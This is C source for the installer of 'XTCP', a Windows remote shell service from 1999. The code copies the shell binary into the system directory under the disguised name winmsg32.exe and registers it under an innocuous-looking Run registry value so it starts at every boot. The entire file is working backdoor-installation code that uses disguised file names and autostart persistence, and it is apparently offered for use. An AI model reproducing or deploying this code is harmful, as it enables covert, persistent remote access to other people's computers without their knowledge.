/*=============================================================================
       Tiny remote shell service program for Windows - XTCP Version 2.01
                      Installer Program Version 2.01
                   Produced The Shadow Penguin Security
                    http://shadowpenguin.backsection.net
        Developed by UNYUN (shadowpenguin@backsection.net), 1999/10/26 
  =============================================================================
*/
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>

#define FILENAME    "xtcp201.exe"
#define INSTALL     "\\winmsg32.exe"

BOOL filecopy(char *fn1,char *fn2)
{
    FILE    *fp1,*fp2;
    int     d;
    char    buf[1200];

    if ((fp1=fopen(fn1,"rb"))==NULL) return FALSE;
    if ((fp2=fopen(fn2,"wb"))==NULL){
        fclose(fp1);
        return FALSE;
    }
    for (;;){
        d=fread(buf,1,1000,fp1);
        if (d<=0) break;
        fwrite(buf,1,d,fp2);
    }
    fclose(fp1);
    fclose(fp2);
    return TRUE;
}
int PASCAL WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, LPSTR pszCmdLine, int CmdShow)
{
    char    sysdir[MAX_PATH+21];
    char    szKey[256];
    HKEY    hKey=0;
    DWORD   disp=0;
    LONG    lResult;

    GetSystemDirectory(sysdir,MAX_PATH);
    strcat(sysdir,INSTALL);
    if (filecopy(FILENAME,sysdir)==FALSE) return(-1);
    
    strcpy(szKey,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    lResult=RegCreateKeyEx(HKEY_LOCAL_MACHINE,szKey,0,NULL,REG_OPTION_VOLATILE,
                        KEY_ALL_ACCESS,NULL,&hKey,&disp);
    if (lResult==ERROR_SUCCESS){
        lResult=RegSetValueEx(hKey,"Msgsv32",0,REG_SZ,sysdir,strlen(sysdir));
        RegCloseKey(hKey);
    }
    return (0);
}
